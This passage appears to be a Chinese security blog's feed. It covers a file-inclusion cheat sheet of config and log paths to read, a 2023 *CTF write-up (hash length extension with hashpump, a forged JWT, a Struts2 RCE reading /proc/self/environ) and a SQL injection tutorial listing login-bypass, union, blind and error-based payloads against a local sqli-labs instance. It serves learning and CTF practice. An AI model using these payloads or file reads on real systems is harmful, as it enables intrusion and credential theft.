<code>/etc/nginx/nginx.conf</code> <code>/usr/local/nginx/conf/nginx.conf</code> <code>/usr/local/etc/nginx/nginx.conf</code></li><li>apache<br><code>/etc/httpd/conf/httpd.conf</code> <code>/etc/apache2/apache2.conf</code> <code>/etc/apache2/httpd.conf</code></li><li>redis<br><code>/etc/redis.conf</code></li><li>ssh<br><code>/etc/ssh/sshd_config</code></li></ul><h4 id="应用日志文件"><a href="#应用日志文件" class="headerlink" title="应用日志文件"></a>应用日志文件</h4><p>利用日志文件获取网站后台地址、api接口、备份、等等敏感信息。</p><ul><li>tomcat 可以先找到<code>/tomcat/bin/catalina.sh</code>，里边有log的配置路径 <code>/webapps/ROOT/logs/catalina.out</code></li><li>apache<br> <code>/var/log/apache2/access.log</code><br><code>/var/log/apache2/error.log</code><br><code>/var/log/httpd/access_log</code><br><code>/etc/httpd/logs/access_log</code><br><code>/etc/httpd/logs/error_log</code><br><code>/etc/httpd/logs/error.log</code></li><li>nginx<br><code>/var/log/nginx/access.log</code><br><code>/var/log/nginx/error.log</code><br><code>/usr/local/var/log/nginx/access.log</code><br><code>/usr/local/nginx/logs</code></li></ul><h3 id="Windows下的利用姿势"><a href="#Windows下的利用姿势" class="headerlink" title="Windows下的利用姿势"></a>Windows下的利用姿势</h3><h4 id="盲读取桌面文件"><a href="#盲读取桌面文件" class="headerlink" title="盲读取桌面文件"></a>盲读取桌面文件</h4><p>fuzz桌面文件，比如1.txt、2.txt、密码.txt、pass.txt、password.txt等。</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>文件包含</tag>
      
      <tag>lfi</tag>
      
      <tag>rce</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023*CTF</title>
    <link href="/2023/10/11/2023starCTF/"/>
    <url>/2023/10/11/2023starCTF/</url>
    
    <content type="html"><![CDATA[<h1 id="2023-CTF"><a href="#2023-CTF" class="headerlink" title="2023*CTF"></a>2023*CTF</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a><strong>web</strong></h2><h3 id="jwt2struts"><a href="#jwt2struts" class="headerlink" title="jwt2struts"></a><strong>jwt2struts</strong></h3><p>源码里提示访问<code>JWT_key.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;./secret_key.php&quot;</span>;<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;./salt.php&quot;</span>;<br><span class="hljs-comment">//$salt = XXXXXXXXXXXXXX // the salt include 14 characters</span><br><span class="hljs-comment">//md5($salt.&quot;adminroot&quot;)=e6ccbf12de9d33ec27a5bcfb6a3293df</span><br>@<span class="hljs-variable">$username</span> = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;username&quot;</span>]);<br>@<span class="hljs-variable">$password</span> = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;password&quot;</span>]);<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&quot;digest&quot;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$username</span> === <span class="hljs-string">&quot;admin&quot;</span> &amp;&amp; <span class="hljs-variable">$password</span> != <span class="hljs-string">&quot;root&quot;</span>) &#123;<br>         <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&quot;digest&quot;</span>] === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$salt</span>.<span class="hljs-variable">$username</span>.<span class="hljs-variable">$password</span>)) &#123;<br>            <span class="hljs-keyword">die</span> (<span class="hljs-string">&quot;The secret_key is &quot;</span>. <span class="hljs-variable">$secret_key</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">die</span> (<span class="hljs-string">&quot;Your cookies don&#x27;t match up! STOP HACKING THIS SITE.&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">die</span> (<span class="hljs-string">&quot;no no no&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>刚开始在想怎么爆破没想到绕过，后面发现是哈希扩展长度攻击绕过md5，参考：<a href="https://blog.csdn.net/LYJ20010728/article/details/116779357">https://blog.csdn.net/LYJ20010728/article/details/116779357</a></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">hashpump</span> -s e6ccbf12de9d33ec27a5bcfb6a3293df -d adminroot -k <span class="hljs-number">14</span> -a ddd<br></code></pre></td></tr></table></figure><p>得到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs Plain">Cookie: digest=9e2b0620d7214919beaea5998acdb7fd<br><br>username=%61%64%6d%69%6e&amp;password=root%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%b8%00%00%00%00%00%00%00ddd<br></code></pre></td></tr></table></figure><p><img src="/../img/2023starCTF/16969546245907.png" alt="img"></p><p>得到key：sk-he001ctf3r</p><p>jwt.io伪造token：<code>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiIsImV4cCI6MjAwNjIxNDE3N30.eoaKqDM23OT-iEZBhva5Yc-GKN876B9f-cbkqaQodgM</code></p><p><img src="/../img/2023starCTF/16969546245871.png" alt="img"></p><p><img src="/../img/2023starCTF/16969546245882.png" alt="img"></p><p>strust2一把梭</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /proc/self/environ<br></code></pre></td></tr></table></figure><p><img src="/../img/2023starCTF/16969546245883.png" alt="img"></p><p><img src="/../img/2023starCTF/16969546245884.png" alt="img"></p><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a><strong>misc</strong></h2><h3 id="snippingTools"><a href="#snippingTools" class="headerlink" title="snippingTools"></a><strong>snippingTools</strong></h3><p>CVE-2023-28303</p><p><a href="https://github.com/frankthetank-music/Acropalypse-Multi-Tool">https://github.com/frankthetank-music/Acropalypse-Multi-Tool</a></p><p><img src="/../img/2023starCTF/16969546245885.png" alt="img"></p><h3 id="old-language"><a href="#old-language" class="headerlink" title="old language"></a><strong>old language</strong></h3><p>谷歌识图</p><p><a href="https://zh.fonts2u.com/dovahkiin.%E5%AD%97%E4%BD%93">https://zh.fonts2u.com/dovahkiin.%E5%AD%97%E4%BD%93</a></p><p><img src="/../img/2023starCTF/16969546245886.png" alt="img"></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>web</category>
      
      <category>misc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>misc</tag>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sql注入</title>
    <link href="/2023/10/10/sql%E6%B3%A8%E5%85%A5/"/>
    <url>/2023/10/10/sql%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><h2 id="数据库知识"><a href="#数据库知识" class="headerlink" title="数据库知识"></a>数据库知识</h2><p>数据库结构：</p><p>mysql</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xl">库-表-字段（数据）<br><span class="hljs-function"><span class="hljs-title">database</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">table</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">column</span>-&gt;</span>value<br></code></pre></td></tr></table></figure><p>常用sql语句：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">数据库创建</span><br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash">create database school;</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">查询数据库</span><br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash">show databases;</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">创建表</span><br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash">create table student(<span class="hljs-built_in">id</span> int(10),username varchar(20),mail varchar(20));</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">查询表</span><br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash">show tables;</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">插入数据</span><br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash">insert into student(<span class="hljs-built_in">id</span>,username,mail) values(1,<span class="hljs-string">&quot;zhangsan&quot;</span>,<span class="hljs-string">&quot;zs@redteam.com&quot;</span>);</span><br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash">insert into student(<span class="hljs-built_in">id</span>,username,mail) values(2,<span class="hljs-string">&quot;lisi&quot;</span>,<span class="hljs-string">&quot;ls@redteam.com&quot;</span>);</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">查询数据</span><br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash"><span class="hljs-keyword">select</span> mail from student;</span><br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash"><span class="hljs-keyword">select</span> * from student;</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">修改数据</span><br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash">update student <span class="hljs-built_in">set</span> username=<span class="hljs-string">&quot;zhangsan2&quot;</span> <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span> = 1 ;</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">删除数据</span><br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash">delete from student <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span> = 1;</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">删除表</span><br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash">drop table student;</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">删除数据库</span><br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash">drop database school;</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">查询登录的用户</span><br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash"><span class="hljs-keyword">select</span> user();</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">查询数据存放地址</span><br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash"><span class="hljs-keyword">select</span> @@datadir;</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">查询数据库的版本</span><br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash"><span class="hljs-keyword">select</span> version();</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-built_in">where</span>条件,<span class="hljs-built_in">limit</span>条件</span><br>where 字段名=x 返回对应字段名为x的那一行<br>limit x,x 查询的数据 只返回第(x-1)行开始的内容 返回x行<br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash"><span class="hljs-keyword">select</span> * from <span class="hljs-built_in">users</span> <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span>=<span class="hljs-string">&#x27;id&#x27;</span> <span class="hljs-built_in">limit</span> 0,1;</span><br></code></pre></td></tr></table></figure><p>PHP连接数据库语句</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$host</span> = <span class="hljs-string">&quot;localhost&quot;</span>;<br><span class="hljs-variable">$user</span> = <span class="hljs-string">&quot;root&quot;</span>;<br><span class="hljs-variable">$pass</span> = <span class="hljs-string">&quot;root&quot;</span>;<br><br><span class="hljs-variable">$conn</span> = <span class="hljs-title function_ invoke__">mysql_connect</span>(<span class="hljs-variable">$host</span>,<span class="hljs-variable">$user</span>,<span class="hljs-variable">$pass</span>);  <span class="hljs-comment">//打开非持久的 MySQL 连接</span><br><span class="hljs-title function_ invoke__">mysql_select_db</span>(<span class="hljs-string">&quot;school&quot;</span>);   <span class="hljs-comment">//选择school数据库</span><br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select * from student&quot;</span>;<br><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);  <span class="hljs-comment">//执行sql语句</span><br><span class="hljs-keyword">while</span>(<span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$result</span>))&#123;  <span class="hljs-comment">//取一行结果为数组（有keyvalue），没有行返回false</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;id:&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;id&quot;</span>].<span class="hljs-string">&quot; username:&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;username&quot;</span>].<span class="hljs-string">&quot; mail:&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;mail&quot;</span>].<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="sql注入-1"><a href="#sql注入-1" class="headerlink" title="sql注入"></a>sql注入</h2><p>原理</p><p>闭合符号如<code>&#39;</code>、<code>&quot;</code>、<code>&#39;)</code>，达到执行其他语句的效果</p><p>万能密码</p><p>sql语句：</p><p><code>SELECT * FROM users WHERE username= &#39;&quot;.$username.&quot;&#39; AND Password= &#39;&quot;.md5($password).&quot;&#39;</code></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-string">&#x27; or 1=&#x27;</span>1<br><span class="hljs-string">&#x27;or&#x27;</span>=<span class="hljs-string">&#x27;or&#x27;</span><br><span class="hljs-string">&quot;or &quot;</span>a<span class="hljs-string">&quot;=&quot;</span>a<br>a<span class="hljs-string">&#x27; having 1=1#</span><br><span class="hljs-string">a&#x27;</span> having <span class="hljs-attribute">1</span>=1--<br>admin<span class="hljs-string">&#x27;--</span><br><span class="hljs-string">admin&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-attribute">1</span>=1--<br>admin<span class="hljs-string">&#x27; or 1=1#</span><br><span class="hljs-string">admin&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1&#x27;</span>--<br>admin<span class="hljs-string">&#x27; or &#x27;</span>1<span class="hljs-string">&#x27;=&#x27;</span>1<br>admin<span class="hljs-string">&#x27; OR 4=4/*</span><br><span class="hljs-string">&#x27;</span>)<span class="hljs-keyword">or</span>(<span class="hljs-string">&#x27;a&#x27;</span>=<span class="hljs-string">&#x27;a</span><br><span class="hljs-string">or 4=4--</span><br><span class="hljs-string">&quot;or 4=4--</span><br><span class="hljs-string">&#x27;</span><span class="hljs-keyword">or</span> <span class="hljs-attribute">4</span>=4/*<br><span class="hljs-string">&#x27;or&#x27;</span>a<span class="hljs-string">&#x27;=&#x27;</span>a<br><span class="hljs-string">&quot;or&quot;</span>=<span class="hljs-string">&quot;a&#x27;=&#x27;a</span><br><span class="hljs-string">&#x27;or&#x27;&#x27;=&#x27;</span><br><span class="hljs-string">&#x27;or&#x27;=&#x27;or&#x27;</span><br><span class="hljs-string">&#x27; OR &#x27;1&#x27;=&#x27;1</span><br><span class="hljs-string">&#x27;OR 4=4%00</span><br><span class="hljs-string">&quot;</span><span class="hljs-keyword">or</span> <span class="hljs-attribute">4</span>=4%00<br>1<span class="hljs-string">&#x27;or&#x27;</span>1<span class="hljs-string">&#x27;=&#x27;</span>1<br>1 <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1&#x27;</span>=1<br>1 <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-attribute">4</span>=4<br>admin<span class="hljs-string">&#x27; UNION Select 1,1,1 FROM admin Where &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span><br>-1%cf<span class="hljs-string">&#x27; union select 1,1,1 as password,1,1,1 %23</span><br></code></pre></td></tr></table></figure><h3 id="union注入"><a href="#union注入" class="headerlink" title="union注入"></a>union注入</h3><p>union的使用：sql语句1 union sql语句2 如果字段数相同的话会同时返回，且sql语句1出错时只返回sql语句2</p><p>注入流程：</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs gauss">判断注入点：<br><span class="hljs-number">1</span> <span class="hljs-keyword">or</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span><br><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span>=<span class="hljs-number">2</span> <span class="hljs-built_in">union</span><br><span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">and</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span><span class="hljs-meta">#</span><br><span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">and</span> <span class="hljs-number">1</span>=<span class="hljs-number">2</span><span class="hljs-meta">#</span><br><span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">or</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span><span class="hljs-meta">#</span><br><span class="hljs-number">1</span>&#x27; <span class="hljs-built_in">union</span>……<span class="hljs-meta">#</span><br><br>获取字段数量，查看回显位置<br><span class="hljs-number">-1</span>&#x27; order by <span class="hljs-number">4</span><span class="hljs-meta">#</span><br><span class="hljs-number">-1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span><span class="hljs-meta">#</span><br><br>查询库<br><span class="hljs-number">-1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-built_in">database</span>()<span class="hljs-meta">#</span><br><br>查询库中表名<br><span class="hljs-number">-1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,table_name from information_schema.tables <span class="hljs-built_in">where</span> table_schema=<span class="hljs-built_in">database</span>() limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span><span class="hljs-meta">#</span><br><br>查询字段名<br><span class="hljs-number">-1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-built_in">group_concat</span>(column_name) from information_schema.columns <span class="hljs-built_in">where</span> table_name=&#x27;users&#x27; limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span><span class="hljs-meta">#</span><br><br>查数据<br><span class="hljs-number">-1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,id from sqli.users limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span><br><br></code></pre></td></tr></table></figure><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; and substr(database(),1,1)=&#x27;</span>s<span class="hljs-string">&#x27;--+</span><br><span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">and</span> length(<span class="hljs-keyword">database</span>())&gt;=<span class="hljs-number">1</span><span class="hljs-comment">--+</span><br><span class="hljs-number">1</span><span class="hljs-string">&#x27; and length(select database())&gt;=1--+</span><br><span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">and</span> ascii(substr((<span class="hljs-keyword">database</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">80</span><span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><h4 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml"></a>updatexml</h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">0x3a</span>、<span class="hljs-number">0x7e</span>是为了在xpath中是语法错误的<br>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/sqli/Less<span class="hljs-number">-2</span>/?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x3a</span>,<span class="hljs-keyword">database</span>(),<span class="hljs-number">0x3a</span>),<span class="hljs-number">1</span>) <span class="hljs-comment">--+</span><br>表名：<br>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/sqli/Less<span class="hljs-number">-2</span>/?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> ),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>) <span class="hljs-comment">--+</span><br>字段名：<br>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/sqli/Less<span class="hljs-number">-2</span>/?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>) <span class="hljs-comment">--+</span><br>数据：<br>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/sqli/Less<span class="hljs-number">-2</span>/?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(id,<span class="hljs-number">0x7e</span>,username,<span class="hljs-number">0x7e</span>,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">security</span>.users),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>) <span class="hljs-comment">--+</span><br>数据：<br>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/sqli/Less<span class="hljs-number">-2</span>/?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(id,<span class="hljs-number">0x7e</span>,username,<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)) <span class="hljs-keyword">from</span> <span class="hljs-keyword">security</span>.users),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>) <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><h4 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue"></a>extractvalue</h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">描述：使用xpath表示法从<span class="hljs-type">XML</span>字符串中提取值<br>xml_docment:<span class="hljs-type">xml</span>标记<br>Xpthstring: 显示输入语句<br>new_value:新值<br>数据库名：<br>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/sqli/Less<span class="hljs-number">-2</span>/?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,concat(<span class="hljs-keyword">database</span>())))<span class="hljs-comment">--+</span><br>表名：<br>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/sqli/Less<span class="hljs-number">-2</span>/?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,concat((<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span>))))<span class="hljs-comment">--+</span><br>字段名：<br>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/sqli/Less<span class="hljs-number">-2</span>/?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,concat((<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>))))<span class="hljs-comment">--+</span><br>数据：<br>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/sqli/Less<span class="hljs-number">-2</span>/?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> extractvalue(<span class="hljs-number">1</span>,concat(<span 